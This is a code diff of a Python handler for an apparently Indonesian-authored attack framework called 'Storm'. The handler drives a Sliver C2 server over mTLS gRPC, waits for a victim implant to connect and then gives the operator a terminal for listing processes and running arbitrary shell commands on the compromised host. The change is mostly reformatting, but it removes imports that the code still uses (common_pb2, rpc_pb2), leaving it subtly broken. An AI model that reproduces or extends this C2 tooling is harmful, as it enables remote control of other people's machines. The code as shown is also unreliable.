@@ -1,10 +1,8 @@
 import grpc
 import time
-import os
-import smf 
+import smf
 
 # Import protobuf hasil compile (sesuaikan path relatifmu jika berbeda)
-from internal.proto.common import common_pb
 from internal.proto.rpc import services_pb
 from internal.proto.rpc import services_pb_grpc
 
@@ -13,6 +11,7 @@ from internal.proto.rpc import services_pb_grpc
 # ==========================================
 _SESSION_ID = None
 _IS_C2_ACTIVE = False
+
 
 # ==========================================
 # GRP/mTLS CONNECTION INITIATOR
@@ -23,25 +22,27 @@ def _get_grpc_client():
     """
     # Sesuaikan path ini ke tempat kamu menyimpan aset kriptografi Storm kamu
     STORM_CA_CERT = "data/smf_ca.crt"
-    OPERATOR_KEY  = "data/smf_ca.key"
+    OPERATOR_KEY = "data/smf_ca.key"
 
     try:
         # Load aset kriptografi
-        with open(STORM_CA_CERT, 'rb') as f: root_ca = f.read()
-        with open(OPERATOR_KEY, 'rb') as f: client_key = f.read()
+        with open(STORM_CA_CERT, "rb") as f:
+            root_ca = f.read()
+        with open(OPERATOR_KEY, "rb") as f:
+            client_key = f.read()
 
         # Bangun kredensial TLS
         credentials = grpc.ssl_channel_credentials(
-            root_certificates=root_ca,
-            private_key=client_key
+            root_certificates=root_ca, private_key=client_key
         )
-        
+
         # Buka socket gRPC ke default port Sliver Server (31337)
-        channel = grpc.secure_channel('127.0.0.1:31337', credentials)
+        channel = grpc.secure_channel("127.0.0.1:31337", credentials)
         return services_pb_grpc.SliverRPCStub(channel)
     except FileNotFoundError as e:
         smf.printd("[handler] [-] Missing cryptography assets", e, level="ERROR")
         return None
+
 
 # ==========================================
 # CORE PIPELINE: MODULES -> HANDLER -> TARGET
@@ -52,7 +53,7 @@ def process_attack_flow(module_data):
     Mengunci terminal dari awal listener hidup sampai C2 session mati.
     """
     global _SESSION_ID, _IS_C2_ACTIVE
-    
+
     rpc_client = _get_grpc_client()
     if not rpc_client:
         return
@@ -60,7 +61,7 @@ def process_attack_flow(module_data):
     # 1. Ekstraksi Opsi Modul
     lhost = module_data.get("LHOST", "0.0.0.0")
     lport = int(module_data.get("LPORT", "8080"))
-    
+
     # 2. Nyalakan Listener di Backend gRPC
     try:
         print(f"\n[handler] Deploying MTLS listener on backend -> {lhost}:{lport}")
@@ -73,8 +74,10 @@ def process_attack_flow(module_data):
 
     # 3. KUNCI LOOP 1: Polling Koneksi Masuk
     print("[handler] [*] Listener active. Scanning connection queue (Ctrl+C to abort)...")
-    empty_req = common_pb2.Empty() # Sliver butuh objek 'Empty' untuk parameter fungsi tanpa input
-    
+    empty_req = (
+        common_pb2.Empty()
+    )  # Sliver butuh objek 'Empty' untuk parameter fungsi tanpa input
+
     while True:
         try:
             # Minta daftar sesi aktif ke server
@@ -83,7 +86,7 @@ def process_attack_flow(module_data):
                 # Tangkap ID sesi terakhir yang masuk
                 _SESSION_ID = res.Sessions[-1].ID
                 break
-            time.sleep(1) # Delay agar tidak DDoS lokal
+            time.sleep(1)  # Delay agar tidak DDoS lokal
         except KeyboardInterrupt:
             print("\n[handler] [-] Scan aborted by operator.")
             _teardown_backend(rpc_client, lport)
@@ -92,19 +95,21 @@ def process_attack_flow(module_data):
     # 4. KUNCI LOOP 2: REPL C2 (Terminal Hijacked)
     _IS_C2_ACTIVE = True
     print(f"\n[handler] [+] TARGET CAUGHT! Session ID: {_SESSION_ID}")
-    
+
     while _IS_C2_ACTIVE:
         try:
             c2_input = input(f"storm(c2-{_SESSION_ID}) > ").strip()
-            if not c2_input: 
+            if not c2_input:
                 continue
             if c2_input == "exit":
-                print("[handler] [*] Exit command received. Terminating implant connection...")
+                print(
+                    "[handler] [*] Exit command received. Terminating implant connection..."
+                )
                 _IS_C2_ACTIVE = False
                 break
-                
+
             _send_implant_command(_SESSION_ID, c2_input, rpc_client)
-            
+
         except (KeyboardInterrupt, EOFError):
             print("\n[handler] [*] Force exiting C2 terminal...")
             _IS_C2_ACTIVE = False
@@ -113,7 +118,7 @@ def process_attack_flow(module_data):
     # 5. FASE CLEANUP (Unlock)
     print(f"[handler] [*] Destroying active state for session {_SESSION_ID}...")
     _teardown_backend(rpc_client, lport)
-    
+
     # Reset State
     _SESSION_ID = None
     print("[handler] [+] Handler sequence completed. Storm Core REPL unlocked.")
@@ -126,14 +131,14 @@ def _send_implant_command(session_id, c2_input, rpc_client):
     parts = c2_input.split()
     cmd = parts[0]
     args = parts[1:]
-    
+
     try:
         if cmd == "ps":
             # Struktur asli request list proses
             req = rpc_pb2.GenericPayloadReq(SessionID=session_id)
             res = rpc_client.GetProcessList(req)
             print(res.Output)
-            
+
         elif cmd == "shell":
             if not args:
                 print("Usage: shell <command>")
@@ -143,7 +148,7 @@ def _send_implant_command(session_id, c2_input, rpc_client):
             if res.Stderr:
                 print(f"Error: {res.Stderr}")
             print(res.Stdout)
-            
+
         else:
             print(f"[-] Command '{cmd}' is not mapped in Storm Handler yet.")
     except grpc.RpcError as e:
